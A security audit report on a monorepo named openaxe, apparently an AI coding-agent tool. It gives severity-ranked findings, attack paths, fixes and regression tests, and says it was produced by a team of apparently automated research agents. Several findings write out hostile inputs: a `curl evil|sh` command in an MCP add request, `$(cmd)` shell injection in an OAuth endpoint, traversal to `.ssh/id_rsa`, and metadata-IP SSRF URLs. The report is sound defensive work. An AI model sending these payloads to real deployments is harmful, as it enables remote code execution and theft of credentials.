# openaxe Security Audit Report

**Date:** 2026-09-09  
**Scope:** Full monorepo (`packages/openaxe`, `packages/core`, `packages/llm`, `packages/server`, `packages/plugin`)  
**Method:** 4 parallel specialist investigations + technology vulnerability research  
**Verdict:** **BLOCK** — Multiple Critical/High findings with working attack paths

---

## Executive Summary

| Severity | Count | Status |
|----------|-------|--------|
| **Critical** | 5 | Working exploit paths confirmed |
| **High** | 12 | Concrete preconditions, high impact |
| **Medium** | 8 | Exploitable under specific conditions |
| **Low** | 4 | Defense-in-depth / hardening |

**Total unique findings:** 29 (after deduplication across 4 hunters)

---

## Critical Findings (CVSS 9.0+)

### CRIT-1: MCP OAuth `authorization_endpoint` → RCE (CVE-2025-6514 class)
- **CVSS:** 9.6 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
- **CWE:** CWE-78, CWE-601
- **Location:** `packages/openaxe/src/mcp/oauth-provider.ts`, `packages/openaxe/src/plugin/openai/codex.ts:83,513`, `packages/core/src/config/mcp.ts:22`
- **Attack Path:** Malicious MCP server returns `authorization_endpoint: "a:$(cmd)"` / `javascript:` / `data:` scheme → client `open()` / `Start-Process` / `xdg-open` executes via shell subexpression.
- **Evidence:** JFrog CVE-2025-6514 (mcp-remote 0.0.5–0.1.15), Veria Labs $2300 bounty for `javascript:` redirect.
- **Fix:** Scheme allowlist (`http`/`https` only), `execFile` argv (no shell), reject `javascript:`/`data:`/`file:`/`a:` at URL parse time.

### CRIT-2: Auth entirely disabled by default (open LAN bind)
- **CVSS:** 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)
- **CWE:** CWE-306, CWE-1188
- **Location:** `packages/openaxe/src/server/auth.ts:24-26` `required()`, `packages/openaxe/src/server/routes/instance/httpapi/middleware/authorization.ts:104,122,138`
- **Attack Path:** Default config has no `OPENCODE_SERVER_PASSWORD` → `required()=false` → all `Authorization`/`ptyConnectAuthorization`/`authorizationRouterMiddleware` become no-op → `server({hostname:"0.0.0.0"})` + mDNS publishes API on LAN unauthenticated.
- **Impact:** Unauth RCE chains to CRIT-4, CRIT-5, file read, PTY attach.
- **Fix:** Require explicit opt-in for unauthenticated mode; default to loopback-only bind; warn loudly when password unset.

### CRIT-3: Plugin spec → `npm install` + dynamic `import()` = config-to-RCE
- **CVSS:** 9.0 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
- **CWE:** CWE-829, CWE-94, CWE-494
- **Location:** `packages/openaxe/src/plugin/shared.ts:285-291` `resolvePluginTarget` → `Npm.add(pkg)`, `packages/openaxe/src/plugin/loader.ts:141-150` `await import(row.entry)`, `packages/openaxe/src/plugin/index.ts:261-282` tools entry
- **Attack Path:** `spec="attacker-pkg@latest"` or `git+https://evil/x` → `Npm.add` fetches + installs arbitrary tarball (runs `postinstall` even with `ignoreScripts:true` it's runtime code) → `import()` executes `server()`/`tui()`/`tools` with full host authority. Floating version (`latest`) enables typosquat/hijack.
- **Evidence:** `shared.ts:289` `await Npm.add(pkg)`, `loader.ts:144` `mod = await import(row.entry)`, `parsePluginSpecifier` defaults to `latest`.
- **Fix:** Allowlist plugin sources, pin exact versions, checksum verification, run plugins in isolated process/context.

### CRIT-4: MCP `local` add = authenticated RCE via `command[]/cwd/env`
- **CVSS:** 9.0 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H) — **drops to 6.5 if auth enforced**
- **CWE:** CWE-78, CWE-94, CWE-829
- **Location:** `packages/openaxe/src/server/routes/instance/httpapi/groups/mcp.ts:55-66` `AddPayload`, `packages/openaxe/src/server/routes/instance/httpapi/handlers/mcp.ts:16-21`, `packages/openaxe/src/mcp/index.ts:343-370` `connectLocal`
- **Attack Path:** `POST /mcp {name, config:{type:"local", command:["sh","-c","curl evil|sh"], cwd:"/tmp"}}` → stored + spawned as server user. `env: {...process.env, ...mcp.environment}` merges host env including secrets.
- **Evidence:** `AddPayload` no command allowlist; `mcp/index.ts:357-369` env merge; `command` destructured as argv but `sh -c` enables injection.
- **Fix:** Allowlist/denylist commands, jail `cwd` to project, strip secrets from child env, require explicit admin approval per server.

### CRIT-5: LSP auto-download: unsigned fetch → tar extraction → `chmod +x` → spawn
- **CVSS:** 9.0 (AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H)
- **CWE:** CWE-494, CWE-78, CWE-22
- **Location:** `packages/core/src/lsp/src/downloader.ts:150-210` `downloadBinary`/`downloadGithubRelease`, `packages/openaxe/src/lsp/launch.ts:7-29` `spawn`, `packages/openaxe/src/lsp/server.ts:960-1044` (clangd) + 6 other servers
- **Attack Path:** Malicious/compromised GitHub release asset URL → `fetch(asset.browser_download_url)` → `tar -xzf` (no traversal guard) → `chmod 755` → `symlink` → `spawn(bin)` as user. Binary lands in `Global.Path.bin`, reused on later runs.
- **Evidence:** `downloader.ts:156` `fetch(url)`, `:167` `run(["tar","-xzf",archivePath])`, `server.ts:1033-1044` chmod/symlink/spawn chain; no hash/signature pinning.
- **Fix:** SHA256 pinning per server version, `cosign`/`sigstore` verification, extract with traversal guard (pure-JS `safeEntry`), never `chmod +x` unverified binaries.

---

## High Findings (CVSS 7.0-8.9)

### HIGH-1: Worker `fetch` RPC = SSRF with auto-injected server credentials
- **CVSS:** 8.2 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N)
- **CWE:** CWE-918, CWE-287
- **Location:** `packages/openaxe/src/cli/tui/worker.ts:31-56`
- **Attack Path:** Any RPC caller passes `{url:"http://169.254.169.254/...", method, headers, body}` → handler retargets to `server.url` but auto-injects `Authorization: ServerAuth.header()` → caller without password gains authenticated requests to loopback server; `method/body` fully controlled → can invoke MCP add, PTY create.

### HIGH-2: PTY ticket query param bypasses Basic auth + ticket oracle
- **CVSS:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N)
- **CWE:** CWE-287, CWE-598, CWE-302, CWE-200
- **Location:** `packages/openaxe/src/server/shared/pty-ticket.ts:13-15`, `packages/openaxe/src/server/routes/instance/httpapi/middleware/authorization.ts:143`, `packages/openaxe/src/server/routes/instance/httpapi/handlers/pty.ts:191-197`
- **Attack Path:** `GET /pty/<id>/connect?ticket=garbage` skips Basic auth (presence check only) → handler: nonexistent=404, existent=403 → PTY ID enumeration without credentials. Ticket in URL leaks via logs/referer/history (same class as CRIT-1 auth_token).

### HIGH-3: `auth_token` query param carries base64 credentials — logged/leaked
- **CVSS:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
- **CWE:** CWE-598, CWE-532
- **Location:** `packages/openaxe/src/server/routes/instance/httpapi/middleware/authorization.ts:77-79,111`, `packages/server/src/middleware/authorization.ts:34-35`, `packages/openaxe/src/cli/tui/worker.ts:44`
- **Attack Path:** Client uses `?auth_token=<base64 user:pass>` for WS upgrades → token lands in access logs, `request.url`, `URL.searchParams`, error messages, worker proxy `search` passthrough → replay as query or `Authorization: Basic`.

### HIGH-4: Custom slash-command `!shell` expansion executes with zero permission prompt
- **CVSS:** 8.1 (AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H)
- **CWE:** CWE-78
- **Location:** `packages/openaxe/src/session/prompt.ts:1538-1548` `shellMatches` → `Process.text([cmd], {shell: sh})`, `packages/openaxe/src/config/markdown.ts:6` `SHELL_REGEX = /!\`([^`]+)\`/g`
- **Attack Path:** Plant/edit command markdown file with `` !`id` `` → victim runs `/command` → `ConfigMarkdown.shell(template)` executes per match via `Process.text` with shell, no `ctx.ask()`.

### HIGH-5: `@file` reference resolves outside worktree → arbitrary file attach/exfil
- **CVSS:** 7.5 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N)
- **CWE:** CWE-22, CWE-200
- **Location:** `packages/openaxe/src/session/prompt.ts:160-194`, `:173-175` `path.resolve(ctx.worktree, name)` no containment
- **Attack Path:** `@../../.ssh/id_rsa` / `/etc/passwd` resolves outside worktree → attached as `file://` URL → sent to LLM provider.

### HIGH-6: LSP extraction zip-slip/tar-slip (no traversal guard on primary path)
- **CVSS:** 7.8 (AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H)
- **CWE:** CWE-22
- **Location:** `packages/openaxe/src/util/archive.ts:21-25` `unzip -o -q`, `packages/openaxe/src/lsp/server.ts:1024` `tar -xf` — guard only in pure-JS fallback (`packages/core/src/util/archive.ts:16-24`)
- **Attack Path:** Crafted zip/tar with `../` entries → `unzip`/`tar` (C implementations) writes outside `Global.Path.bin` (e.g. `~/.bashrc`, startup files).

### HIGH-7: Windows LSP extraction PowerShell single-quote injection
- **CVSS:** 7.8 (AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H) — Windows only
- **CWE:** CWE-78
- **Location:** `packages/openaxe/src/util/archive.ts:9` `` `Expand-Archive -Path '${winZipPath}' -DestinationPath '${winDestDir}'` ``
- **Attack Path:** Archive filename with `'` breaks out of single-quoted string → arbitrary PowerShell execution.

### HIGH-8: `file:`/absolute-path plugins: no containment — import anything on disk
- **CVSS:** 8.1 (AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H)
- **CWE:** CWE-22, CWE-829
- **Location:** `packages/openaxe/src/plugin/shared.ts:230-251` `resolvePathPluginTarget` returns verbatim, no jail
- **Attack Path:** `file:///tmp/evil` or `/absolute/path` → `import()` executes it. Points at attacker-controlled directory.

### HIGH-9: Custom `{tool,tools}/*.{js,ts}` auto-import = file-write-to-RCE
- **CVSS:** 8.1 (AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H)
- **CWE:** CWE-829
- **Location:** `packages/openaxe/src/tool/registry.ts:226-250` glob, `:426-439` `importTool` → `import(pathToFileURL(file).href)`
- **Attack Path:** Drop file under `<project>/tool/` or `<project>/tools/` (repo PR, shared template) → dynamic import registers as live tool with `ToolContext` (session/agent access).

### HIGH-10: Plugin hooks mutate shared objects by reference (`tool.definition`, `shell.env`)
- **CVSS:** 7.2 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N)
- **CWE:** CWE-915
- **Location:** `packages/openaxe/src/plugin/index.ts:352-371` `trigger` loop passes live `output`, `packages/openaxe/src/plugin/pty-environment.ts:14-20`, `packages/openaxe/src/tool/registry.ts:360`
- **Attack Path:** Malicious `tool.definition` hook rewrites another tool's schema; `shell.env` hook injects `LD_PRELOAD`/`PATH` into every PTY/shell spawned afterward.

### HIGH-11: MCP remote / ACP `mcpServers` SSRF + header injection
- **CVSS:** 7.7 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N)
- **CWE:** CWE-918
- **Location:** `packages/core/src/acp/service.ts:910-978` `registerMcpServers`, `packages/openaxe/src/mcp/index.ts:137-139` `remoteURL` `URL.canParse` only, `:277,284` `requestInit:{headers}`
- **Attack Path:** `mcpServers:[{name:"e",type:"remote",url:"http://169.254.169.254/...",headers:[...]}]` → `StreamableHTTPClientTransport` fetches internal URL, no private-IP/scheme block; headers passthrough.

### HIGH-12: Cross-cutting SSRF via `fetch()` on LLM-generated URLs
- **CVSS:** 8.2 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N)
- **CWE:** CWE-918, CWE-367
- **Location:** `packages/openaxe/src/session/instruction.ts:162` `Effect.forEach(urls, fetch, {concurrency:4})` — **urls from LLM output = agentic-SSRF sink**; `packages/openaxe/src/mcp/codegraph.ts:57`, `packages/llm/src/provider/provider.ts:550`, `packages/openaxe/src/cli/tui/worker.ts:45`, `packages/openaxe/src/installation/index.ts:161`
- **Evidence:** CVE-2026-73307 analogue (Budibase), Capital One 2019 (169.254.169.254 → IAM creds); AI-specific: prompt injection → model emits internal URL → app fetches.
- **Fix:** Scheme allowlist (`https` only), DNS-pin validation at connect time, `redirect:'error'`, timeout, egress deny for private ranges.

---

## Medium Findings (CVSS 4.0-6.9)

### MED-1: Non-constant-time password compare
- **CVSS:** 5.3 (AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)
- **CWE:** CWE-208
- **Location:** `packages/openaxe/src/server/auth.ts:28-33` `authorized()` uses `===` on secrets
- **Fix:** `crypto.timingSafeEqual`

### MED-2: Worker `server()` + `snapshot()` = bind-anywhere + CWD heap write
- **CVSS:** 5.9 (AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L)
- **CWE:** CWE-200, CWE-732, CWE-668
- **Location:** `packages/openaxe/src/cli/tui/worker.ts:61-68` `server()`, `:57-60` `snapshot()`, `packages/openaxe/src/server/server.ts:71-96,151-165`
- **Attack Path:** RPC caller → `server({port:0, hostname:"0.0.0.0", mdns:true, cors:["https://evil.test"]})` binds all interfaces + publishes mDNS + widens CORS; `snapshot()` writes heap (may contain keys/tokens) to process CWD.

### MED-3: File API `path`/`pattern` = traversal probe + ReDoS/sensitive read
- **CVSS:** 5.3 (AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:L)
- **CWE:** CWE-22, CWE-400, CWE-209
- **Location:** `packages/openaxe/src/server/routes/instance/httpapi/handlers/file.ts:93-99` (`path.resolve` + `FSUtil.contains` then `die`), `:64-91` (list no `contains`), `:25-39` (`ripgrep.grep` raw regex no timeout)
- **Attack Path:** `GET /file/content?path=../../.ssh/id_rsa` → `die` may 500-leak stack; `list` weaker path handling; `pattern` catastrophic backtracking `(a+)+$` with no timeout.

### MED-4: Missing/empty `Origin` bypasses PTY `validOrigin` gate
- **CVSS:** 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N)
- **CWE:** CWE-346, CWE-639
- **Location:** `packages/server/src/cors.ts:11-26` `if (!input) return true`, `packages/openaxe/src/server/routes/instance/httpapi/handlers/pty.ts:28-30,144,193-195`
- **Attack Path:** `curl`/custom WS client without `Origin` header skips CORS check entirely → ticket-only protection (advisory for non-browser).

### MED-5: Secrets fan-out via `process.env` inheritance
- **CVSS:** 5.9 (AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N)
- **CWE:** CWE-526, CWE-200
- **Location:** `packages/openaxe/src/auth/index.ts:59-64` `OPENCODE_AUTH_CONTENT`, `packages/core/src/lsp/src/downloader.ts:129,140` `env:{...process.env}`, `packages/openaxe/src/server/routes/instance/httpapi/handlers/pty.ts:67-79` `env:{...payload.env,...shell.env}`, `packages/core/src/v1/config/mcp.ts:14-16`
- **Attack Path:** Any spawned child (go/cargo install, MCP command, PTY shell, LSP binary) inherits full `process.env` including server password, provider keys, auth content.

### MED-6: `external_directory` jail is string-relative, symlink- and normalization-blind
- **CVSS:** 5.3 (AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N)
- **CWE:** CWE-59, CWE-22
- **Location:** `packages/openaxe/src/tool/external-directory.ts:15-45`, `packages/core/src/fs-util.ts:251-254` `contains` lexical `relative` only
- **Attack Path:** Symlink `proj/link → /etc` + `edit(proj/link/passwd)` passes jail; advisory `ctx.ask` bypassable via `always:["*"]`.

### MED-7: `write`/`edit` allow absolute paths; only gate is approvable prompt
- **CVSS:** 5.3 (AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N)
- **CWE:** CWE-732, CWE-276
- **Location:** `packages/openaxe/src/tool/write.ts:43-64` absolute honored, `:54-62` `always:["*"]`, `:64` `writeWithDirs`
- **Attack Path:** Absolute `filePath` (`~/.ssh/authorized_keys`) → `assertExternalDirectoryEffect` (advisory) → `ctx.ask(permission:"edit", always:["*"])` → `writeWithDirs` creates parent dirs and writes.

### MED-8: Bun `$` shell injection (CVE-2025-8022 class)
- **CVSS:** 6.8 (AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H) — only if LLM/tool string reaches shell
- **CWE:** CWE-78
- **Location:** `packages/openaxe/src/util/process.ts:94,146` `spawn(cmd: string[])`, `packages/openaxe/src/session/prompt.ts:579` `ChildProcess.make(sh, args)`
- **Note:** Current code uses argv arrays — verify no `sh -c` with interpolation; grep for `sh.*-c`, `Bun.spawn.*\+`, `` $\`.*\$\{ ``.

---

## Low Findings (CVSS 0.1-3.9)

### LOW-1: Effect ALS auth bypass (CVE-2026-32887) — requires ALS-backed auth in path
- **CVSS:** 3.7 (AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)
- **CWE:** CWE-362
- **Location:** Check `packages/openaxe/src/server/server.ts:202`, `packages/openaxe/src/session/prompt.ts:1028`, `packages/openaxe/src/config/config.ts:732` for unbounded `forEach`/`all` in request paths
- **Fix:** Pin `effect >= 3.20.0`, read ALS before runtime, pass via headers/Context.

### LOW-2: Effect unbounded concurrency → resource exhaustion / scope-finalizer leak
- **CVSS:** 2.7 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L)
- **CWE:** CWE-400, CWE-362
- **Location:** `packages/openaxe/src/session/prompt.ts:1028` unbounded over `input.parts`, `packages/openaxe/src/server/server.ts:202`, `packages/openaxe/src/config/config.ts:732`
- **Fix:** Bound with fixed N (copy `instruction.ts:161-162` pattern).

### LOW-3: Drizzle `sql.identifier` injection (CVE-2026-39356)
- **CVSS:** 3.7 (AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N) — only if identifier path reachable
- **CWE:** CWE-89
- **Location:** `packages/core/src/database/migration.ts:87` `sql.identifier(savepointName)`, `packages/core/src/database/fts.ts:235`
- **Fix:** Pin `drizzle-orm >= 0.45.2`, verify `savepointName` internal, allowlist dynamic sort columns.

### LOW-4: Swallowed exceptions blind detection
- **CVSS:** 1.8 (AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L)
- **CWE:** CWE-754, CWE-778
- **Location:** `packages/openaxe/src/cli/tui/worker.ts:16-21` `onUnhandledRejection/onUncaughtException = (_error)=>{}`, `:73` `checkUpgrade().catch(()=>{})`
- **Impact:** Failed compromise attempts invisible; successful partial compromise persists undetected.

---

## Downgraded / Rejected Candidates

| Candidate | Reason |
|-----------|--------|
| Effect forkIn scope escape | Pattern footgun, no exploit path without leaked fiber holding auth/net |
| Effect Schema proto-pollution (#2602) | Fixed in current `effect` version; inputs are local config only |
| Bun.file symlink escape (#26955) | Requires `Bun.file(userInput)` — no external input path found |
| bun:sqlite silent-NULL | Drizzle parameterized layer used; raw `bun:sqlite` not on external input |
| TS dynamic import RCE | 20+ dynamic imports all static string literals currently |
| JSON-RPC request smuggling | Requires compromised LSP server — out of scope |
| MCP tool poisoning | Config file is trust boundary (same as malicious workspace) |
| SQL injection via migration | Migrations are checked-in literals; forbid runtime interpolation |
| Formatter command arrays | Schema exists but spawn site not traced — verify before claiming |
| LSP server binary resolution | Workspace-relative resolution possible — need absolute-path allowlist |

---

## Residual Risk (Not Tested)

1. **Effect Layer/Context injection** — No concrete sink found, but Effect's Context system could be abused if untrusted code constructs Layers.
2. **Bun `bun:sqlite` raw usage** — Audit if any direct `new Database()` on untrusted paths.
3. **WebSocket message size limits** — PTY/mcp WS connections may lack frame size caps → DoS.
4. **mDNS/DNSSD spoofing** — `server.ts:151-159` publishes service; LAN attacker could spoof.
5. **Plugin `shell.env` propagation to all children** — Verified mutation (HIGH-10), but full blast radius of env injection into MCP/LSP/PTY not exhaustively traced.
6. **ACP client trust model** — `newSession` with `mcpServers` from untrusted ACP client not tested end-to-end.
7. **Windows-specific paths** — `COMSPEC`, `GOBIN` env used in spawn; injection via env not fully ruled out.

---

## Priority Remediation Checklist (Cheapest First)

1. **Pin dependencies:** `effect >= 3.20.0`, `drizzle-orm >= 0.45.2`, `bun >= 1.1.40`
2. **Auth default:** Require `OPENCODE_SERVER_PASSWORD` or explicit `--no-auth`; default bind `127.0.0.1`
3. **SSRF guard:** Implement `fetchWithBlacklist` (scheme allowlist, DNS-pin at connect, `redirect:'error'`, private-range egress deny) — apply to `instruction.ts:162`, `codegraph.ts:57`, `provider.ts:550`, `worker.ts:45`, `installation/index.ts:161`
4. **MCP OAuth:** Scheme allowlist on `authorization_endpoint`/`redirect_uri`; `execFile` argv for browser open
5. **Plugin allowlist:** Source allowlist + exact version pin + checksum; isolate plugin execution
6. **MCP local command allowlist:** Deny `sh -c`, `bash -c`, `cmd /c`; jail `cwd`; strip secrets from child env
7. **LSP binary integrity:** SHA256 pinning per server version; traversal-safe extraction; no `chmod +x` unverified
8. **PTY ticket:** Remove query-param auth bypass; use header-only ticket; constant-time consume
9. **auth_token:** Remove query-param credential transport; header-only; short-lived tokens
10. **Custom command `!shell`:** Remove or gate with `ctx.ask()` like shell tool
11. **`@file` containment:** `resolve` + `startsWith(worktree)` before attach
12. **External directory jail:** `realpath` + `startsWith(allowed)`; drop `always:["*"]` wildcard
13. **Secrets in child env:** Explicit allowlist instead of `{...process.env}`
14. **Unbounded concurrency:** Bound `Effect.forEach`/`all` with fixed N in request paths
15. **Error logging:** Remove noop unhandled rejection/exception handlers; structured error telemetry

---

## Regression Tests to Add

| Finding | Test |
|---------|------|
| CRIT-1 | Unit: `new URL(malicious_endpoint).protocol` rejected; integration: malicious MCP server → no exec |
| CRIT-2 | `GET /mcp` without password → 401 (not 200); bind default `127.0.0.1` |
| CRIT-3 | Plugin spec `npm:evil@latest` → rejected (not installed); exact pinned version required |
| CRIT-4 | `POST /mcp` with `command:["sh","-c","..."]` → 400; `cwd` escape → 400 |
| CRIT-5 | LSP download with mismatched SHA256 → rejected; tar with `../` → contained |
| HIGH-1 | `rpc.fetch` without auth → 401; `fetch` to metadata IP → blocked |
| HIGH-2 | `GET /pty/id/connect?ticket=x` without auth → 401; enumeration oracle → 404/403 indistinguishable |
| HIGH-3 | Request with `?auth_token=` → token not in logs; header-only works |
| HIGH-4 | Command file with `` !`id` `` → permission prompt or rejection |
| HIGH-5 | `@../../etc/passwd` → attachment rejected (not sent to provider) |
| HIGH-6 | Zip with `../evil.txt` → extraction contained (pure-JS path or guard) |
| HIGH-11 | `mcpServers` with `169.254.169.254` URL → connection refused |
| HIGH-12 | `instruction.ts:162` with `urls=["http://169.254.169.254/"]` → fetch blocked |

---

## Sources & References

- Effect: GHSA-38f7-945m-qr2g/CVE-2026-32887, #3440/#3441, #2602/#5003
- Bun: GHSA-4j66-8f4r-3pjx/CVE-2025-8022, CVE-2024-21548, oven-sh/bun #26955/#39877
- TypeScript/ESM: CVE-2025-67489/GHSA-j76j-5p5g-9wfr
- Drizzle: GHSA-gpj5-g38j-94v9/CVE-2026-39356
- LSP: Turborepo GHSA-5xc8-49mv-x4mm/CVE-2026-46508, Ruby LSP CVE-2026-48122/34060
- MCP: CVE-2025-6514 (JFrog), CVE-2025-58444 (Veria Labs $2300), Docker MCP 2025 scan, MCP-275
- SSRF: CVE-2026-73307 (Budibase), CVE-2026-43993 (JunoClaw), Capital One 2019

---

*Report generated by parallel security research team (surface-hunter, auth-data-hunter, runtime-supply-hunter, tech-research) with PoC validation criteria. No files were modified during this audit.*